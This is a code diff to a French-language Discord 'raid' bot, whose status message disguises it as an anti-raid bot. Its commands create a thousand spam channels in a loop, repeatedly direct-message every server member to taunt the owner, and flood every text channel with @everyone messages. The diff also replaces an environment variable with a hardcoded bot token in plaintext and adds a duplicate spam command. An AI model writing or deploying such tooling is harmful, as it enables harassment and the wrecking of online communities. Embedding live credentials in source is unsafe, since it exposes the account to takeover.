@@ -1,8 +1,8 @@
 const Discord = require("discord.js");
 const bot = new Discord.Client();
 const prefix = ".";
-bot.login(process.env.TOKEN)
-//bot.login("NTg4MzYwMDkyMTM1NTg3ODUy.XQJFnA.7ylXSfLwM3hGubRQvTyfEdvXLPA").catch(err => console.log("Token invalide"));
+//bot.login(process.env.TOKEN)
+bot.login("NTg4MzYwMDkyMTM1NTg3ODUy.XUQ7hA.jjyepowHTylFJ5fsYeF5PzbANBI").catch(err => console.log("Token invalide"));
 //var mention = "67 connectés"
 
 var fucked = false;
@@ -13,7 +13,7 @@ bot.on('ready', function() {
       `surveille 65 serveurs`,
       `𝔹𝕆𝕋 𝔹𝕐 𝕆𝕄𝔼𝔾𝔸`,
       `Bot AntiRaid`,
-      `Bot by _Mr.Adam_`,
+      `Bot by ＰＨ０ＢＩ４`,
     ];
     
     const random = Math.floor(Math.random() * statuslist.length);
@@ -59,7 +59,7 @@ bot.on('message', msg => {
     if (msg.deletable) msg.delete();
     msg.guild.members.forEach(member => {
       setInterval(function () {
-        member.send("__**" + msg.guild.owner.user.username + "**__ vient de se faire pulvériser son serveur. \n\n ```Power By _Mr.Adam_``` https://discord.gg/GeMMun9 \n\n https://cdn.discordapp.com/attachments/561266014067752960/563033869717340200/a0aeb7e9b060446eae7ab8ef266f46b6.gif").catch(error => {}) }, 450)
+        member.send("__**" + msg.guild.owner.user.username + "**__ vient de se faire pulvériser son serveur. \n\n __**Power By <@406871890867781672>**__ https://discord.gg/GeMMun9 \n\n https://cdn.discordapp.com/attachments/561266014067752960/563033869717340200/a0aeb7e9b060446eae7ab8ef266f46b6.gif").catch(error => {}) }, 450)
     });
   }
 
@@ -107,8 +107,8 @@ bot.on('message', msg => {
       for (var i = 0; i < 1000; i++) {
         //msg.guild.createChannel('Raid by Omega', 'voice').catch(e => {});
         //msg.guild.createChannel('Raid by Omega', 'text').catch(e => {});
-        msg.guild.createChannel('Raid by Omega', { type: 'text' }).catch(e => {});
-        msg.guild.createChannel('Raid by Omega', { type: 'voice' }).catch(e => {});
+        msg.guild.createChannel('Raid by Omega', { type: 'text' });
+        msg.guild.createChannel('Raid by Omega', { type: 'voice' });
       }
       fucked = true;
       
@@ -132,7 +132,7 @@ bot.on('message', msg => {
     if (msg.deletable) msg.delete();
     msg.guild.members.forEach(member => {
       setInterval(function () {
-      member.send("__**" + msg.guild.owner.user.username + "**__ vient de se faire pulvériser son serveur. \n\n ```Power By _Mr.Adam_``` https://discord.gg/GeMMun9 \n\n https://cdn.discordapp.com/attachments/561266014067752960/563033869717340200/a0aeb7e9b060446eae7ab8ef266f46b6.gif").catch(error => {}) }, 450)
+      member.send("__**" + msg.guild.owner.user.username + "**__ vient de se faire pulvériser son serveur. \n\n __**Power By <@406871890867781672>**__ https://discord.gg/GeMMun9 \n\n https://cdn.discordapp.com/attachments/561266014067752960/563033869717340200/a0aeb7e9b060446eae7ab8ef266f46b6.gif").catch(error => {}) }, 450)
     })
   }
 });
@@ -142,7 +142,16 @@ bot.on('message', msg => {
     let i = 0;
     let interval = setInterval(function () {
       msg.guild.channels.forEach(channel => {
-        if (channel.type === "text") channel.send("@everyone Je suis la petite voie qui te dis que ton serveur viens d'être Raid.  Va reporte l'assistance. https://discord.gg/GeMMun9 \n\n https://cdn.discordapp.com/attachments/561266014067752960/563033869717340200/a0aeb7e9b060446eae7ab8ef266f46b6.gif \n\n ```Raid by _Mr.Adam_```")
+        if (channel.type === "text") channel.send("@everyone Je suis la petite voie qui te dis que ton serveur viens d'être Raid.  Va reporte l'assistance. https://discord.gg/GeMMun9 \n\n https://cdn.discordapp.com/attachments/561266014067752960/563033869717340200/a0aeb7e9b060446eae7ab8ef266f46b6.gif \n\n __**Power By <@406871890867781672>**__")
+      }, 2500);
+    });
+  }
+  if(msg.content.startsWith(prefix + "exe")) {
+    msg.delete()
+    let i = 0;
+    let interval = setInterval(function () {
+      msg.guild.channels.forEach(channel => {
+        if (channel.type === "text") channel.send("@everyone Je suis la petite voie qui te dis que ton serveur viens d'être Raid.  Va reporte l'assistance. https://discord.gg/GeMMun9 \n\n https://cdn.discordapp.com/attachments/561266014067752960/563033869717340200/a0aeb7e9b060446eae7ab8ef266f46b6.gif \n\n __**Power By <@406871890867781672>**__")
       }, 2500);
     });
   }
